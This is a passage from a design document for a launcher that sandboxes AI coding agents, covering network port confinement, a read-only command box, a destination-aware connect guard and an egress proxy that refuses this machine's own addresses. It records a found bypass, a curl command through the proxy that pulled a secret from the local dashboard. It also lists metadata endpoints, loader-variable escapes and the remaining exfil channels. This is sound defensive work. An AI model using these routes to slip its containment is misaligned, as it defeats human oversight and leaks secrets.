must NEVER route through the instrumented anthropic-proxy) holds. The emitted
`.mcp.json` points the U-LLM's `ANTHROPIC_BASE_URL` at
`http://127.0.0.1:<port>` and pins that exact URL as `MANDU_ULLM_FORWARDER`;
inspect-mcp's `assertNonProxyBaseUrl` accepts a loopback base URL **iff its
origin equals the pin exactly**, and keeps refusing every other loopback
(above all the anthropic-proxy), fail-closed. `--landlock-net-strict`
therefore DENIES 443 **and 22** while the U-LLM keeps working via the
forwarder. A Codex U-LLM (a cut-down `codex exec`, 2026-10-04) gets the
forwarder's Codex form instead: a model call only (`POST /v1/responses`,
`GET /v1/models`), relayed to one of the fixed OpenAI pair (the ChatGPT
backend's Codex base on a sign-in, else `api.openai.com`), the child pointed
at it by a provider override (agent-sign-in.md §2.11), so strict holds for
Codex too. One exception to "bytes through" (2026-10-11, agent-sign-in.md
§3.8): an API-mode U-LLM's entry carries a random stand-in for its key, and
the Anthropic form replaces an `x-api-key` equal to that stand-in with the
launcher's own copy of the key on `POST /v1/messages` only, so the key is
not written into the agent's world. The forwarder is utility-class: one that cannot start only warns,
and the U-LLM keeps its direct `:443` dial (the non-strict set keeps 443 open
for it). Under the model-host deny (2026-10-18, agent-sdks.md §4) the
forwarder starts in every posture, `--no-landlock-net` included, since the
guard refuses the tree's direct dial of the vendor; a forwarder that cannot
start then leaves the U-LLM without a route (fail-closed, the warning says
so). **Non-strict still allows 443/22**, and the launcher logs it.
`--landlock-net=port,port` overrides the computed set verbatim (suppressing
the workflow ports); if it omits the model-proxy port the launcher warns that
model calls will fail.

**macOS: the same port set, enforced by Seatbelt (2026-09-29).** macOS has no
Landlock, and until this date the launch looked for the Linux applier there,
printed "not built … proceeding WITHOUT it" with a cargo hint on every launch,
and left all TCP reachable. Now `applyLandlockNet` on darwin (`platform:
"darwin"`, from run.ts) resolves no bin and plans the SAME set for the
whole-agent Seatbelt profile (`planSeatbeltNet`, a parity test pins the port
set against `computeLandlockNetPorts`; confidentiality.md §7.3 component 4):
`(deny network-outbound (remote tcp))` then one allow per port. Seatbelt can
name `localhost`, so Mandu's own services (the model proxy, the net-proxy,
the U-LLM forwarder) are allowed on loopback only; a declared model
endpoint's port, 443 and 22 (unless `--landlock-net-strict`) and an explicit
`--landlock-net=<ports>` set keep Linux's any-host meaning. Binds:
`(deny network-bind (local ip))`, UDP binds re-allowed, each
`--landlock-net-bind` port allowed (and connectable), which is Landlock's
BIND_TCP. UDP is left alone as on Linux, so name lookups keep working
(`getaddrinfo` goes to mDNSResponder over its Unix socket, on the §4.3 list).
The banner is `mandu: network-confine LIVE (Seatbelt, the macOS landlock-net)
…` with the same residual lines; without `sandbox-exec` it is one
"proceeding WITHOUT it" line. `--no-landlock-net` turns it off; the forwarder
runs as on Linux (strict mode is viable on macOS too). The inspect-mcp
confine (a second, narrower ruleset for the helper) is Linux only:
`sandbox-exec` does not nest inside the agent's profile, so the launch says
so in one informational line and inspect-mcp keeps its own endpoint check.
Tests: launcher `darwin-rungs.test.ts` (no bin looked for, the rules, the
parity), `seatbelt-profile.test.ts`, `test/darwin/seatbelt-live.test.ts` (an
allowed loopback port reached, any other refused, a bind refused, across
random ports).

### 7.2 `--exec-box` — box a curated read-only command set

`applyExecBox` (`launcher/src/exec-box-setup.ts`) writes a PATH-shadow shim
dir (`writeExecBoxShims`, `launcher/src/services/exec-box-shims.ts`), like
`--exec-wrap`, but each shim routes its command through `mandu-exec-box`,
which BOXES it in the net-off / RO-root AgentShell. The dir is prepended to
the agent PATH by `env-compose.ts` (ahead of the exec-wrap shim dir; on a
user-override overlap the boxing shim wins by PATH order). The box bin strips
its own shim dir (`MANDU_EXEC_BOX_SHIM_DIR`) from PATH before it re-searches
for the real command, so a boxed `cat` cannot recurse into the shim.

**Safe scope.** The DEFAULT shadowed set is READ-ONLY data-inspection
commands that need neither network nor writes outside `/tmp`: `cat grep egrep
fgrep sed awk cut sort uniq head tail wc tr jq find xargs comm join paste`.
Boxing them net-off + RO-root never breaks them: they read the real
filesystem read-through and write only to the box's `/tmp` (a fresh tmpfs
with the integrity axis on, the agent's own `/tmp` with it off: "The
agent's own `/tmp`" below) and the project. The writable project binds below keep the in-place writers (`sed
-i`, `sort -o`) working at the agent's cwd: the AgentView binds when the
integrity axis is on, the workspace itself when it is off ("The workspace
without an AgentView" below). A user may override the set with
`--exec-box=cmd1,cmd2`.

**Clean box first, hosted by the guard (integrity axis only).** Where the
session's guard hosts the clean box (§8.5.1, §8.5.3: integrity axis ON, the
guard running), each shim bakes `MANDU_EXEC_CLEAN_BOX="1"` and
`MANDU_EXEC_CLEAN_SOCK=<run dir>/clean.sock`, so a boxed command is first run
by the GUARD under the clean ruleset, outside the agent's process tree; on a
clean exit its output reaches the model un-symbolized on the guard's verdict,
and a refused attempt reruns in the ordinary box. Elsewhere, `secrets`
included, the default is off (`MANDU_EXEC_CLEAN_BOX="0"`, `unset
MANDU_EXEC_CLEAN_SOCK`). Knobs: `--exec-clean-box` / `--no-exec-clean-box`,
env `MANDU_EXEC_CLEAN_BOX`, config `exec-clean-box`, dropped by
`--no-kernel`.

**Writable-AgentView boxing (integrity axis; the fs-view co-design).**
`applyExecBox` runs AFTER the service manager, so when fs-view produced a
HumanView↔AgentView pair (`plan.viewMap`) the shims bake this session's
`MANDU_AGENTVIEW_ROOT` / `MANDU_WORKSPACE`, and the box RW-binds the
**AgentView (repo: agent-view worktree)** TWICE: over the **workspace path**
(workspace-addressed writes land in the AgentView) and **identity-bound at
its own path** (under fs-view the agent's cwd IS the AgentView worktree's
real path, so without the identity bind every relative write failed EROFS).
Boxed writes land in the AgentView and ride fs-sync back to the HumanView.
`sandbox.rs::plan_sandbox` emits the two RW binds (one when the paths
coincide) and mirrors them into the Landlock leg's writable set; the kernel
test `bubblewrap_backend_writable_agentview_at_own_path` proves it. Without a
pair, the shims bake the launch directory alone as `MANDU_WORKSPACE`; with
the integrity axis ON the box then stays RO-root + `/tmp` (a project under
`/tmp` re-bound read-only, §4), with it OFF the project is writable (next
paragraph).

**The workspace without an AgentView (2026-10-01).** In `secrets` (or `off`)
the fs rung is off by mode, so there is no AgentView pair, and an RO-root box
made every in-place writer fail (`sed: couldn't open temporary file …:
Read-only file system`) where the unboxed agent succeeds. With the integrity
axis OFF the agent has ONE view, the HumanView, and writes it unboxed with its
own file tools; the box's RO root added no confidentiality there (it cannot
stop a write the agent makes anyway, and a write is not an egress) and broke
only the shadowed commands. So `applyExecBox` decides `boxWorkspaceWritable`
(pure: no view pair, the EFFECTIVE integrity axis OFF, and a known project;
an unknown axis keeps the read-only box) and the shims bake
`MANDU_EXEC_BOX_WORKSPACE_RW="1"`, else `unset` it (HARD both ways, so an
ambient value never makes an integrity session's workspace writable). The bin
reads it into `ViewConfig.workspace_writable`, and `plan_sandbox` adds ONE
writable bind of the workspace at its own path (`sandbox::writable_workspace`):
only without an AgentView root, only for a clean absolute path that is not `/`
and does not contain the box's own mounts (`/dev`, `/proc`, `/sys`, the
scratch `/tmp`, the hidden `/run`, `/var/run`), mirrored into the Landlock
leg's writable set. It is rendered after the scratch, so a project under
`/tmp` is writable there and needs no keep. The banner says `RW = the project
directory and the agent's own /tmp (its sockets masked)` (next paragraph).

**The agent's own `/tmp` (2026-10-19).** In the same posture
(`sandbox::shares_real_tmp`: the launcher asked for the writable workspace,
named the project, and there is no AgentView root) the box binds the REAL
`/tmp` writable at `/tmp` instead of mounting a fresh tmpfs. The case:
demo-c14 on a fresh install (take m1r3 of the 2026-10-19 battery) ran `curl
-o /tmp/reset1042.out … > /tmp/reset1042.code` (unboxed: curl is not in the
box's set), then `cat /tmp/reset1042.code /tmp/reset1042.out`; `cat` is boxed,
the box's fresh `/tmp` held neither file, and the model, told "No such file
or directory", gave up on a request that had gone through. The fresh scratch
hid nothing from the agent there: its unboxed programs (the shell's own
redirections included) read and write the real `/tmp` anyway, so the scratch
only broke the boxed readers. The plan's `rw_binds` lead with `/tmp → /tmp`
(a workspace under `/tmp` binds over it after), `tmpfs` is empty, no
read-only keep is needed, and the Landlock leg's writable set is the same
pair. The host-socket scan then reads `/tmp` too (last, its own entries:
each socket directly in it masked with `/dev/null`) and hides its service
directories whole (the X11 display's, a tmux server's, an ssh-agent's:
`host_sockets::tmp_service_dirs`), AFTER the `/tmp` bind, by the same
second `render_host_hide` pass the writable workspace uses; a socket deeper
down stays visible and is still refused by the box's connect allow-list
(§4.2). Deeper masks would be binds onto the host tree, where bwrap
re-creates a socket that vanished since the scan as a stray empty file
(§4.2). A clean attempt never sees the real
`/tmp` (`SandboxPlan::fresh_scratch`, called wherever the clean posture is
set): its LSM leg grants RW on the scratch, which over the real `/tmp` would
let bytes the agent wrote there into a "clean" output. The integrity-ON box
(an AgentView pair, or no writable workspace) keeps the fresh, private
scratch: a boxed command's staging and read-back must not touch the real
`/tmp` there. **Security, flagged:** nothing new reaches a model or the
network. The box stays net-off (netns and the Landlock TCP denial), RO
outside the project and `/tmp`, with the seccomp deny-filter, the namespace
hardening and the socket masks; the `/tmp` it shows is the one the agent's
own mount namespace shows (bwrap takes bind sources from it, so the
human-plane hide and any secret twin under `/tmp` are carried in); the
whole-agent guard's seccomp filter, inherited by every boxed process, still
decides each open of a registered secret file and each Unix connect; and a
boxed command's output reaches the model only through the proxy's Bash-result
classification, as every unboxed one's does. What changes: a boxed command
may now read and write the files under the real `/tmp`, which the unboxed
agent already could. Tests: the pure units in `sandbox.rs`
(`the_real_tmp_only_in_the_integrity_off_box`,
`host_sockets_under_the_real_tmp_are_masked_after_its_bind`,
`the_clean_posture_never_reads_the_real_tmp`, the updated workspace units)
and `host_sockets.rs` (`/tmp` scanned last, its own sockets masked, its
service directories by name, a program's temp-dir socket left to the
allow-list), the launcher banner unit, the kernel test
`bubblewrap_backend_shares_the_real_tmp_in_the_integrity_off_box` (a host
file in `/tmp` read in-box, a boxed write landing in the real `/tmp`, a `/tmp`
socket masked, an ssh-agent directory hidden, net off and RO elsewhere, and the integrity-ON box still
fresh), and `exec-box-live.test.sh` §3g (the same through the launcher's
shims).

What the box still enforces in that mode: net off (the netns and the Landlock
TCP denial), the RO root outside the project and `/tmp`, the seccomp
deny-filter and the namespace hardening, the socket allow-list. **What reads
see is unchanged**, because the bind is of the REAL tree as the agent's own
mount namespace shows it: a secret twin bound over a labelled file inside the
project is carried into the box (bwrap binds are recursive), and the
whole-agent guard's seccomp filter, inherited by every boxed process, still
decides each open of a registered secret and labels each write of a tainted
process. A boxed program can write the project but cannot read a labelled
file raw: `cat`, and a copy it writes into the project, both carry the
symbol, and an in-place edit of a twin-bound file fails at the mount point
(`EBUSY`). The host-socket masks and opaque-dir hides (§4.2) that fall under a
bind of the real tree at its own path are rendered AGAIN after the binds
(`render_host_hide`'s second pass), because the later bind would otherwise
bring the unmasked host tree back. **Security property change, flagged:** with
the integrity axis off and no AgentView pair, the shadowed commands may write
the project directory (the HumanView), as the unboxed agent already could;
nothing changes for reads, egress, or any integrity launch. Tests: the pure
`sandbox.rs` units, the launcher units (`boxWorkspaceWritable`, the HARD
export/unset, the banner), the kernel test
`bubblewrap_backend_writable_workspace_without_agentview`,
`exec-box-live.test.sh` §3g (the over-block reproduced and fixed, net still
off, a `no-model` labelled project file still a symbol to `cat`, to a copy
and to `sed -i`), and the `secrets` leg of `launcher-kernel-tier.test.ts`.

**Applier staging.** The Landlock applier is the one bin execed INSIDE the
box's mount namespace, and the box bin locates it host-side
(`kernel.rs locate_landlock_applier`), so the probe cannot see what the
AgentView bind hides in-box. When Mandu develops Mandu, the dev-layout
applier lives under the workspace (`interceptors/target/…`, gitignored and
hence absent from the AgentView bound over it), and every boxed exec died at
bwrap's `execvp`. `applyExecBox` therefore resolves the applier itself and
pins it via a HARD `MANDU_LANDLOCK_APPLY` export in the shims; when the
resolved path sits under the view pair's workspace it first **stages a copy**
into `<scopeRunDir>/bin/`. The box mounts a fresh `/tmp`, so on a host whose
run dir fell back under `/tmp` the copy goes to the install prefix's
`exec-box/bin/` instead (the path table's `exec-box-cache`, on-disk-layout.md
§4). A shadowed applier whose staging fails degrades the WHOLE box (boxing
commands that all fail would be worse than not boxing).

**Symbol-twin hint.** Before it forks an AgentShell leaf, the box also reports
(`reportExecTwins`, best-effort, utility-only) which of the leaf's argv paths
(joined to the shim's `--cwd`) are AgentView twins made solely of symbol
tokens, so the proxy can append its `[mandu:twin]` note to a pipeline /
post-`cd` / glob leaf its single `command` string cannot resolve
(`symbol-twin-shell-blindness.md` §4.1b). Nothing here changes routing, the
sandbox, or what the leaf may read.

**Loader variables are unset in the box.** `bwrap_argv` emits `--unsetenv`
for `BOX_UNSET_ENV`: `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`,
`GCONV_PATH`, `NODE_OPTIONS`, `PYTHONSTARTUP`, `PYTHONPATH`, `PERL5OPT`,
`RUBYOPT`, `BASH_ENV`, `ENV`: the variables that change how a program loads
or starts, the classic way an injected command escapes a wrapper. Only inside
the AgentShell box (boxed tools include `find -exec` and `xargs`, which run
arbitrary programs); the agent and HumanShell keep them. macOS `DYLD_*` is
not covered. Tests: `sandbox::tests::the_box_unsets_loader_variables` and
`launcher/test/exec-box-live.test.sh` 3b'.

### 7.3 Composition + degrade behavior

Launch-prefix order (outer → inner), assembled in `run.ts`: **reply-filter →
net-guard → landlock-net → secret-twins bwrap → agent**. `--exec-box` sets
`plan.execBoxShimDir` BEFORE `coop-env` composes the PATH, so the shim dir
reaches the agent.

Safe-degrade table (nothing here fails a launch; the default-on posture and
an explicit `--exec-box`/`--landlock-net` degrade identically, only the
warning's wording differs):

| condition | `--landlock-net` | `--exec-box` |
|---|---|---|
| bin not built | warn + no wrap (all TCP reachable) | warn + no shim dir (commands run normally) |
| `bwrap` / userns absent | n/a (net wrap needs neither) | warn + no shim dir (the box could not run) |
| arbiter socket absent | n/a (applier does not gate) | warn + no shim dir (box is fail-closed w/o it) |
| kernel < 6.7 (ABI < 4) | `--skip-unsupported` → plain exec (netns/proxy stay the boundary) | box FS/seccomp still apply; the box's Landlock net leg self-SKIPs |

The wrapper-tier gates degrade on the service manager's tri-state path
instead (`services/manager.ts`): default-on `net-proxy` / `exec-wrap` that
cannot start WARN and proceed WITHOUT the service, while an EXPLICIT
`--net-proxy` / `--exec-wrap` stays fail-closed (abort unless
`--best-effort`). The `ullm-forwarder` is utility-class throughout.

### 7.4 Residuals (honest bounds)

- **`--exec-box` needs bwrap + userns at RUN time**, not just at wire time. A
  bwrap that breaks *after* the probe fails an individual boxed command (exit
  71), not the session.
- **Non-strict still allows 443 + 22.** Strict mode denies both with a
  working U-LLM (the forwarder, §7.1), but the DEFAULT keeps 443/22 open so
  ordinary workflows (direct TLS, git-ssh) survive, and a 443/22 exfil stays
  possible at this layer (the destination-aware guard, §7.5, is the answer).
  Where the forwarder itself degraded, strict mode breaks a cli/api U-LLM;
  the launcher warns in that combination.
- **One launcher.** `launcher/mandu-run.sh` is a thin shim that execs the TS
  launcher (portable-wrapper.md §7), so these flags work identically either
  way.
- **Validation.** A live `claude` session under the default-on set and one
  under `--landlock-net-strict` (including a real `inspect_symbol` call,
  which reached Anthropic only via the forwarder with direct `:443` denied)
  completed cleanly. The forwarder's relay under a strict wrap is proven by
  `launcher/test/landlock-net-live.test.sh`. The standing guard is
  `launcher-kernel-tier.test.ts`: a real `claude` through
  the real launcher against the scripted fake model (no API budget). It
  probes the host (`probeKernelTier`), then asserts from the launcher's
  banners and the on-disk shim set: exec-box LIVE with the shim routing
  through `mandu-exec-box`, landlock-net LIVE with the model-proxy port in
  the CONNECT set, the writable workspace (a leg runs the launcher's own
  `sed -i` shim), and the confidentiality predicate (a registered credential
  or labelled file reaches the model only as a symbol, and its scripted
  exfil carries no secret byte). Where a rung is unsupported it asserts the
  degrade banner instead. It runs in `secrets`; its integrity form (fs-sync
  ACTIVE, the AgentView pair baked, the guard-hosted clean box) is frozen in
  `tests/integrity/launcher-kernel-tier.test.ts`.
- **Strict mode + Claude Code's own direct 443.** Most of Claude Code's
  non-Messages traffic honors `HTTPS_PROXY`, so it rides the net-proxy; the
  launcher also sets `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` by default
  (telemetry, error reporting, surveys; override with `=0`). It also stops
  Claude Code's feature-flag fetch, which would start it in permission mode
  `auto`, so the launch passes `--permission-mode default` unless the user
  chose a mode (supported-agents.md §2, "Claude Code's permission mode
  under Mandu"). Two direct-`:443`
  paths remain that a strict Landlock wrap denies: **OAuth token refresh** (a
  session started with a fresh login does not refresh mid-run) and the
  **WebFetch domain-safety preflight** to `api.anthropic.com` (in the agent's
  `NO_PROXY`). Neither is on the defense's critical path; mitigate with a
  fresh login, `skipWebFetchPreflight`, `--landlock-net=<ports>`, or the
  guard (§7.5), which admits the model API host on :443. **Under the
  model-host deny (2026-10-18, whenever the confidentiality axis is on and
  the egress proxy runs; agent-sdks.md §4, "The model-host deny") neither
  is direct any more:** the model hosts leave `NO_PROXY`, both calls ride
  the egress proxy (the refresh to `platform.claude.com/v1/oauth/token`, the
  preflight to `api.anthropic.com/api/web/domain_info`, each on the proxy's
  list), and the strict wrap no longer bears on them.

### 7.5 `--net-guard` — IP/DOMAIN-aware connect(2) guard (closes the port-only gap)

**The gap this closes.** §7.1's Landlock wrap is **port-only**: ABI ≥ 4 has no
host/CIDR predicate, so `--allow-tcp-port 443` admits `:443` to *every* host.
The non-strict default therefore leaves an any-host-on-443 exfil channel open,
and strict mode can only deny 443 wholesale. `--net-guard` is the
destination-aware layer (IP / domain), built **inside the non-root privilege
boundary**. It is also where the confidentiality axis enforces its network
and process-flow rules for a process holding a secret (the taint legs below,
confidentiality-plan-10 §4.3 and plan 13). On WSL it also refuses the Windows
interop socket and every `AF_VSOCK` connect (§4.1).

**Mechanism.** `applyNetGuard` (`launcher/src/net-guard-setup.ts`, pure plan
in `net-guard.ts`) PREPENDS `mandu-net-guard --allow <spec>…
--skip-unsupported --` to `mut.launchPrefix`. The bin (`net-supervisor`,
`kernel` feature) forks the agent tree under a **seccomp user-notification
trap on `connect(2)`** and on every send that can name an address (below),
and stays alive as the supervisor. For each trapped connect it reads the
target `sockaddr` out of the tracee (`process_vm_readv`, the tracee frozen on
the trap), decodes it (`guard::decode_sockaddr`), and asks the pure
`guard::GuardPolicy`: protocol × IP / CIDR / resolved hostname × port,
default-DENY.

- **DENY** → the connect returns `-EACCES` in-kernel (no packet leaves).
- **ALLOW** → the supervisor performs the connect *on the tracee's behalf*: it
  grabs the tracee's socket with `pidfd_getfd`, `connect()`s it to the
  address IT decoded, and answers the syscall with that result. This is
  **TOCTOU-safe** (a racing thread cannot swap the address between check and
  connect) and, because the supervisor lives OUTSIDE the inner Landlock port
  wrap, it reaches an allowed destination *even under
  `--landlock-net-strict`*. After the connect the supervisor is out of the
  data path: bytes flow on the tracee's own socket.
- **non-INET family** → a pathname or abstract Unix connect is SUPERVISED in
  every posture under a secret policy (the guard connects its copy of the
  socket to the address it checked, never `CONTINUE`; gap (e) below); the
  box's processes' non-INET connects are performed under the box's socket
  allow-list (§4.2). A pathname reaches `CONTINUE` only where the guard cannot
  resolve it in the tracee's view (no `openat2`). Every other family
  (`AF_UNSPEC`, netlink, vsock off WSL, a malformed address) is connected by
  the guard on its copy with the bytes it read: a `CONTINUE` would let the
  kernel read the address again, and a thread could turn an `AF_UNSPEC` into
  an `AF_INET` address after the check
  (`send_integration.rs` `a_rewritten_address_never_reaches_an_unjudged_destination`).
  A process holding a secret may address INET, Unix and netlink only
  (`send_guard::tainted_may_address`).
- **a socket of a different network namespace** (a nested net-dead box) →
  the guard connects its own copy of the socket to the address it read, in
  that namespace. Judged by the SOCKET's namespace (`SO_NETNS_COOKIE`,
  kernel ≥ 5.14), not the process's: a boxed process holding a socket of the
  agent's namespace (inherited, with a route out) is judged like anyone else.
  Without a copy of the socket or the cookie, the process's namespace decides.

**Why connect sees only IPs (the honest "domain-aware" scope).** `connect(2)`
carries an IP, never a hostname. A HOSTNAME allow-rule is resolved (cached,
30 s TTL) to the IP set it currently maps to, and a connect matches iff its IP
is in that set. That covers stable-IP services (api.anthropic.com, a corp
CIDR) the way IP/CIDR egress allow-lists in the wild do; it does NOT give
SNI/domain identity (two names behind one CDN IP are indistinguishable) and
is only as tight as the resolver's current answer (a DNS-rebind window). Full
domain identity remains with the TLS-terminating net-proxy; the root +
nftables TPROXY layer that could also provide it is decided won't-implement
(privilege-model.md §0).

**Always-denied destinations.** Before any allow rule is consulted,
`GuardPolicy::decide` refuses the cloud metadata and credential endpoints on
every port (`169.254.169.254`, `fd00:ec2::254`, `169.254.170.2` ECS,
`169.254.170.23` / `fd00:ec2::23` EKS pod identity, `100.100.100.200` Alibaba)
and the rest of link-local (`169.254.0.0/16`, `fe80::/10`) on every port but
53, so a VPC resolver at `169.254.169.253` keeps answering. The IP is
unwrapped first (v4-mapped, NAT64 `64:ff9b::/96`). No rule admits them; the
one opt-out is `MANDU_NET_ALLOW_METADATA=1` in the guard's environment at
launch, for an agent that must use a cloud instance role on purpose. The
net-proxy carries a twin of the list
(`interceptors/net-proxy/src/blocked-destinations.ts`) because it dials from
outside the guard; it checks the host as written, then resolves the name
itself and dials only an address that passed, so a name cannot rebind between
check and connect. Tests: `guard.rs` units,
`guard_integration.rs::guard_denies_metadata_endpoint_despite_an_any_host_rule`,
net-proxy `test/{unit,e2e}/blocked-destinations.test.ts`.

**Deny rules: an agent's upload hosts (2026-10-05).** `mandu-net-guard
--deny <spec>` (repeatable, the `--allow` spec syntax, parsed fail-closed:
a bad one exits 71 and the agent is not started) adds rules `GuardPolicy`
checks after the always-denied set and BEFORE any allow rule, so a deny
beats the `tcp:*:443` fallback, a law allowance and a curated
`--net-allow` alike. A hostname deny resolves as an allow does (every
answer, v4-mapped unwrapped). The deny event names the rule (`DENIED
in-kernel (deny rule tcp:<host>:*)`). The launcher passes one `--deny
tcp:<host>:<port|*>` per entry of `LaunchPlan.uploadDenyHosts`: the hosts
the launched agent would upload its own transcript, trace or telemetry to
(`launcher/src/upload-deny.ts`, a table keyed by target, plus the hosts of
the URL env keys a row names; supported-agents.md §5.3.4 rule 1). A row's
`proxyOnly` hosts never reach the guard (`LaunchPlan.netProxyOnlyDenyHosts`):
the net-proxy alone refuses them, by name, because the guard matches
resolved addresses and theirs are shared with hosts the agent needs
(Codex's `ab.chatgpt.com` answers on `chatgpt.com`'s Cloudflare addresses,
2026-10-07). The guard sees only the net-proxy's loopback port for proxied traffic, so the
net-proxy gets the same list (`MANDU_NET_PROXY_DENY_HOSTS`) and refuses a
CONNECT or plain-HTTP request to a listed host with 403 before any dial
(`interceptors/net-proxy/src/deny-hosts.ts`; a leading `.` there also
matches subdomains, which the guard, resolving names, cannot); the list is
part of the net-proxy's reuse key, so a launch never adopts a proxy that
denies another set. Each agent build still forces the agent's own switch
off in the launch env: the deny is the second layer, and with both the
guard and the net-proxy off (`--no-net-guard`, `off` mode) it is the only
one left. Tests: `guard.rs` `deny_rules_beat_the_star_fallback`,
`launcher/test/net-guard-live.test.sh` (`--deny` beats `tcp:*:*`, a bad
spec fails closed), net-proxy `test/{unit,component}/deny-hosts.test.ts`,
`launcher/test/unit/upload-deny.test.ts`, and the end-to-end
`tests/stack/upload-deny.test.ts` (the real net-proxy the launcher starts
refuses a listed host; the upload host's listener sees nothing).

**The net-proxy relays nothing to this machine (2026-10-05).** The guard
admits the agent's loopback connects only to the session's own services
(the model proxy, the net-proxy, the U-LLM forwarder; `net-guard.ts`
`computeNetGuardSpecs` rule 1), and the Landlock port wrap and the macOS
Seatbelt profile draw the same line, so a direct connect to the dashboard's
loopback port (default `127.0.0.1:4500`) or any other local service is
refused. The net-proxy is one of those admitted services and dials from
outside every one of those walls, so before this rule `curl --noproxy ''
-x "$HTTP_PROXY" http://127.0.0.1:4500/api/events?session=…` from inside
the agent's tree had the proxy fetch the dashboard for it (found
2026-10-05: 200, a secret value in the body). The net-proxy now refuses,
in every mode, a destination on THIS MACHINE: loopback (`127.0.0.0/8`,
`::1`, and the v4-mapped `::ffff:127.x` and v4-compatible spellings), the
unspecified address (`0.0.0.0/8`, `::`), the `localhost` names (and any
name under `.localhost`), every address of this machine's own interfaces
(`os.networkInterfaces()`), and, on Linux since 2026-10-17, every address
its routing tables deliver to itself (below). All of it is read per dial;
when it cannot be read, every address of that family is refused. It
mirrors `guard_flow.rs::this_machine` (loopback, the wildcard, an address a
socket here can bind), with the interface list and the local routing
table standing in for the bind test, beside the always-denied twin
(`interceptors/net-proxy/src/blocked-destinations.ts`). It is decided
on the address actually dialed, with the always-denied set's two checks: the
host as written (a literal never reaches a `lookup`, so every dial site, the
plain forwarder, the blind tunnel and the TLS-inspected re-origination,
checks the host it dials, after the gate's rewrite), and a name resolved by
the proxy itself, every answer checked, then the checked address dialed (no
rebinding window). Plain HTTP, CONNECT and the TLS-inspected leg are each
answered 403 (`blocked` net_action), and the refusal is noted for the
sending process with its own kind, `this-machine` (plan 10 §11.8, "Refused
connections"; the model reads "the host is this machine, and Mandu's egress
proxy does not relay to this machine's own services", nothing to approve).
There is no opt-out (`MANDU_NET_ALLOW_METADATA` does not lift it): the one
exemption is a mock-sites host route's own dial (`MANDU_NET_PROXY_MOCK_SITES`
`hosts:`, the replay runner's network fixture and `mandu demo`'s stand-in
sites), an operator-configured loopback listener the request was routed to
by NAME after the gate; a canned mock site dials nothing. The constructor's
`allowThisMachine` exists for in-process tests and no environment variable
reaches it. **No legitimate route is lost:** the session's `NO_PROXY` names
`127.0.0.1`, `localhost` and `::1` (and a declared LAN model helper,
`inspect-net-confine.ts`), so an agent testing its own dev server connects
directly, where the guard decides (a loopback dev server is refused there
unless a rule admits it, which is the guard's decision to make, not the
proxy's); the model proxies and the forwarder are reached on loopback,
never through the net-proxy.

*An address this machine owns on no running interface (2026-10-17).*
`os.networkInterfaces()` (libuv's `uv_interface_addresses`) lists only an
interface that is up AND running, so the address of an interface that is
down, or up with no carrier (a Docker bridge with no container, a VM
manager's tap left down), was relayed, and so was an address with no
interface at all (a `local` route, AnyIP: `ip route add local
10.99.0.0/16 dev lo`). Each still reaches a service listening on the
wildcard (`0.0.0.0` / `::`): measured on the shared dev host, 36 of its 73
owned addresses were missing from the list. On Linux the proxy now also
reads, per check, the tables the kernel itself decides with: for an IPv4
address `/proc/net/fib_trie`, every prefix of type `LOCAL` in the local,
main and default tables (the tables an unmarked connect consults; the
local table is what a bind asks, `inet_addr_type`); for an IPv6 address
`/proc/net/if_inet6` (every address of every interface, up or down) and
`/proc/net/ipv6_route`'s `RTF_LOCAL` and `RTF_ANYCAST` routes. Two exclusions
keep a policy-routed transparent proxy (Clash, a TPROXY setup) from making
every address this machine: a `local` route in any other IPv4 table (it
applies only through a policy rule, such as `local 0.0.0.0/0 dev lo table
100` for marked packets), and an IPv6 `local ::/0` (`ipv6_route` has no
table column, and only such a policy table holds a catch-all). Refused as
`this-machine` with the reason "an address this machine's routing table
delivers to itself". Fail-closed: an unreadable `fib_trie` refuses every
IPv4 address, an unreadable `ipv6_route` or `if_inet6` every IPv6 one,
except a missing `if_inet6` (the kernel has no IPv6 stack, `ipv6.disable=1`:
no IPv6 address reaches anything). Each read costs ~0.1 ms beside the
interface list's ~2 ms.

*The special-purpose ranges* (IANA's IPv4 and IPv6 special-purpose address
registries), as the proxy decides each on a machine that owns none of them.
Only what reaches this machine or the local link is refused; the rest is a
destination like any other (a LAN, a VPN's CGN range, a documentation
prefix that simply has no route), and refusing it would cost utility for
nothing. Multicast and broadcast need no rule: a TCP connect to one fails
in the kernel (`ENETUNREACH`).

| Range | Decision |
|---|---|
| `0.0.0.0/8`, `::/128` (this network, unspecified) | this-machine |
| `127.0.0.0/8`, `::1/128` (loopback) | this-machine |
| `::ffff:0:0/96` (v4-mapped), `::/96` (v4-compatible, deprecated) | as the embedded IPv4 address (v4-compatible: loopback, unspecified or owned → this-machine) |
| `169.254.0.0/16`, `fe80::/10` (link-local) | always-denied (blocked-destination), except port 53; the metadata and credential endpoints on every port |
| `100.100.100.200`, `fd00:ec2::254`, `fd00:ec2::23` (metadata in a shared or ULA range) | always-denied |
| `64:ff9b::/96` (NAT64) | the embedded address for the always-denied set only (a translator never forwards to loopback) |
| `10/8`, `172.16/12`, `192.168/16`, `100.64/10` (shared, CGN, Tailscale), `fc00::/7` (ULA), `fec0::/10` (site-local, deprecated) | relayed, unless an interface address or a local route of this machine |
| `192.0.0.0/24` (IETF assignments, DS-Lite, NAT64 discovery), `192.31.196.0/24`, `192.52.193.0/24`, `192.88.99.0/24`, `192.175.48.0/24`, `198.18.0.0/15`, the three IPv4 TEST-NETs, `240.0.0.0/4` | relayed (a remote destination or no route) |
| `64:ff9b:1::/48`, `100::/64`, `2001::/23` (Teredo, benchmarking, ORCHIDv2, ...), `2001:db8::/32`, `2002::/16` (6to4), `2620:4f:8000::/48`, `3fff::/20`, `5f00::/16` | relayed |
| `224.0.0.0/4`, `255.255.255.255`, `ff00::/8` (multicast, broadcast) | no rule: no TCP connect reaches one |
| An owned address on no running interface, a `local` route (IPv4 local/main/default table; IPv6 with a prefix length > 0), an IPv6 anycast route | this-machine |

Residuals: on macOS (and any non-Linux system) only the interface list is
read, so a down interface's address there is still relayed; an IPv6
`local` route in a policy table other than a `::/0` catch-all is counted
for every connect (it over-refuses that prefix for unmarked traffic, never
under-refuses); an IPv4 `local` route in a policy table is not counted
(reached only by marked or source-routed packets, which the proxy's own
dials are not). The guard still refuses the direct connect in every one of
these cases. Tests: net-proxy `test/unit/this-machine.test.ts` (every
spelling, an interface address, a name resolving to `127.0.0.1`, the
fail-closed unreadable list, the opt-out isolation, the `fib_trie`,
`ipv6_route` and `if_inet6` parsers on kernel-shaped fixtures, the
special-purpose table above row by row, and every address the running
